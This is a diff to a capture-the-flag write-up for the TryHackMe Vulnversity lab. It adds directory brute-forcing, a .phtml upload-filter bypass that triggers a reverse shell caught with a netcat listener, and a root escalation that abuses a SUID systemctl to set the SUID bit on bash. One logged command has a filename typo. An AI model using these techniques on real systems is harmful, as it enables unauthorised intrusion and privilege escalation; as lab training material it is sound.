@@ -75,15 +75,18 @@ we found a website here\
 <img width="834" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/223df16e-eea1-4d50-b6e4-e6e7c46de9f0">
 
 we do a feroxbuster to find all the directory possible and we found 2 interesting directories : /internal and /internal/uploads
+```bash
+$ feroxbuster -u http://vulnversity.thm:3333/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+```
 <img width="1332" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/eee5c1ff-9765-43a5-a9fe-e600b800450a">
 
 So we have a web page with a upload form, so we try to upload a shell.php but there is a protection which doesn't allow .php file
 <img width="385" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/c1f23282-ef05-4952-9810-a8b55e0f320b">
 
-let's try to change the extension to an executable file but less known like .phtml so we have shell.html :
+let's try to change the extension to an executable file but less known like .phtml so we have shell.phtml :
 <img width="512" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/b8fd5673-af47-4438-8f5e-122132fd2cba">
 
-Bingo ! we can now got our reverse shell with a nc listener on our attacking machine :
+Bingo ! we can now got our reverse shell with a nc listener on our attacking machine by visiting the url http://vulnversity:3333/internal/uploads/shell.phtml
 ```bash
 $ nc -lvnp 6666
 listening on [any] 6666 ...
@@ -113,3 +116,26 @@ www-data@vulnuniversity:/$ export TERM=xterm
 # User flag
 We found the user flag in /home/bill/user.txt that is readable by everyone
 
+# Root flag
+If we look at the SUID binaries on the machine, we found that there is an interisting binary
+```bash
+-rwsr-xr-x 1 root root 1387496 Feb 28 12:15 /bin/systemctl
+```
+
+We can use it to escalate our privileges with creating a custom service and running it (https://gtfobins.github.io/gtfobins/systemctl/#suid)
+```bash
+www-data@vulnuniversity:/tmp$ echo "[Service]" >> privesc.service
+www-data@vulnuniversity:/tmp$ echo "Type=oneshot" >> privesc.service 
+www-data@vulnuniversity:/tmp$ echo "ExecStart=/bin/sh -c 'chmod u+s /bin/bash'" >> privesc.service 
+www-data@vulnuniversity:/tmp$ echo "[Install]" >> privesc.service 
+www-data@vulnuniversity:/tmp$ echo "WantedBy=multi-user.target" >> privesc.servic
+www-data@vulnuniversity:/tmp$ systemctl link /tmp/privesc.service 
+Created symlink from /etc/systemd/system/privesc.service to /tmp/privesc.service.
+www-data@vulnuniversity:/tmp$ systemctl enable --now /tmp/privesc.service 
+Created symlink from /etc/systemd/system/multi-user.target.wants/privesc.service to /tmp/privesc.service.
+www-data@vulnuniversity:/tmp$ /bin/bash -p
+bash-4.3#
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+bash-4.3#
+```
+Finally we're root :)
